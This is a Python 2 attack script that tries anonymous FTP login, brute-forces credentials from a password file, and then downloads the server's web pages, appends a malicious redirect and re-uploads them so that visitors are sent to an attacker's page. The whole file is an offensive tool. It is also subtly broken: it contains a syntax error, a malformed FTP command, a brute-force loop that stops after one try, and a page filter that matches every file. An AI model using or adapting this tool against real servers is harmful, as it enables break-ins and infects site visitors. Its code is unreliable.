#!/usr/bin/python

#Author: Miguel Rodriguez
#Date: 10/06/2016
#Description: try anonymous logon and dictionary attack to gain access.
#search for default web pages. For each of these pages,
#download a copy and adds a malicious redirection.
#upload the infected page back to the FTP server
#Contact: marbrb1@gmail.com

import ftplib
import argparse
import time

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)  # FTP client
        ftp.login("anonymous", "me@anything.com")
        print "[*] {} FTP anonymous logon succeeded".format(hostname)
        ftp.quit()
        return True

    except:
        print "[*] {} FTP anonymous logon failed".format(hostname)
        return False

def bruteLogin(hostname, passFile):
    try:
        passFile = open(passFile, "r")

    except IOError:
        print "Bad path file"
        return
    for line in passFile.readlines():
        time.sleep(1)
        user = line.split(":")[0]
        passwd = line.split(":")[1]s.strip("\r").strip("\n")
        print "[*] Trying {}/{}".format(user,passwd)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user, passwd)
            print "[+] {} FTP logon succeeded {}/{}".format(hostname, user, passwd)
            ftp.quit()
            return (user, passwd)
        except:
            pass

        print "[-] Could not brute force FTP credentials."
        return (None, None)

def defaultPages(ftp):  # take a FTP connection as argument
    try:
        dirList = ftp.nlst()    #list the directory contents of the FTP server
    except:
        dirList = []
        print "[-] Could not list directory contents"
        print "[-] Skipping to next target"
        return

    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print "[+] Found default page {}".format(fileName)
        retList.append(fileName)
    return retList

def injectPage(ftp, page, redirect): # take a FTP connection as argument
    f = open(page + ".tmp", "w")
    ftp.retrlines("RETR" + page, f.write)
    print "[+] Downloaded page " + page
    f.write(redirect)
    f.close()
    print "[*] Injected malicious IFrame on " + page
    ftp.storlines("STOR" + page, open(page + ".tmp"))
    print "[+] Uploaded injected page " + page

def attack(username, password, targetHost, redirect):
    ftp = ftplib.FTP(targetHost)
    ftp.login(username, password)
    defPages = defaultPages(ftp)
    for page in defPages:
        injectPage(ftp, page, redirect)

def main():
    parser = argparse.ArgumentParser(description="Complete FTP attack")
    parser.add_argument("-f", "--file", dest="passFile", help="specify the user/password file", required=True)
    parser.add_argument("-H", "--host", dest="targetHost", help="specify target host(s)", required=True)
    parser.add_argument("-r", "--redirect", dest="redirect", help="specify a redirection page", required=True)
    arguments = parser.parse_args()

    username = None
    password = None
    if anonLogin(arguments.targetHost):
        username = "anonymous"
        password = "me@anything.com"
        print "[+] Using anonymous credentials to attack"
        attack(username, password, arguments.targetHost, arguments.redirect)

    elif arguments.passFile != None:
        (username, password) = bruteLogin(arguments.targetHost, arguments.passFile)

    if password != None:
        print"[+] Using credentials {}/{} to attack".format(username, password)
        attack(username, password, arguments.targetHost, arguments.redirect)

    else:
        print "[-] Password not found :-("

if __name__ == "__main__":
    main()
